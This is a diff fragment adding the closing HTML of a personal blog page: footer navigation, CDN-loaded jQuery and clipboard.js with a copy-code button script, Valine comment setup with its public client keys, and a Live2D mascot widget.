+       --><li><a href="/vlog/">vlog</a></li><!--
+     --><!--
+       --><li><a href="/gallery/">Photo</a></li><!--
+     --><!--
+       --><li><a href="/friends/">Friends</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+    <div id="vcomments" class="blog-post-comments"></div>
+    <script>
+        new Valine({
+            el: '#vcomments',
+            visitor: true,
+            appId: 'Ku71Pva4EFeKIH5y64LCYVwp-gzGzoHsz',
+            appKey: 'wqnsWKV8eVHemIwCa9vo9vRg',
+            placeholder: '快来评论一下吧',
+            avatar: 'robohash'
+        })
+    </script>
+
+    
+<!-- utterances Comments -->
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"superSample":2,"width":200,"height":350,"position":"right","hOffset":0,"vOffset":-20},"mobile":{"show":false,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
